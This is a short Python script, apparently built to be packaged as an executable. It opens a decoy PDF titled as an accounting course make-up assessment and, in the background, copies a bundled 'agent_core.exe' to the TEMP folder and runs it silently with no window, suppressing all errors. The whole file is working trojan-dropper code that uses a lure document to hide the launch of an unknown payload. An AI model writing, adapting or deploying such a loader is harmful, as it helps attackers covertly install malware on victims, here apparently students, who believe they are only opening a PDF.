
import sys, os, subprocess, shutil

def resource_path(relative_path):
    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base_path, relative_path)

pdf_name = "ACCT 8211 Make up Assessment.pdf"
agent_name = "agent_core.exe"

# 1. Open PDF
try:
    pdf_path = resource_path(pdf_name)
    os.startfile(pdf_path)
except: pass

# 2. Extract and Run Agent
try:
    agent_path = resource_path(agent_name)
    target_path = os.path.join(os.environ['TEMP'], agent_name)
    shutil.copy2(agent_path, target_path)
    subprocess.Popen([target_path], creationflags=subprocess.CREATE_NO_WINDOW)
except: pass
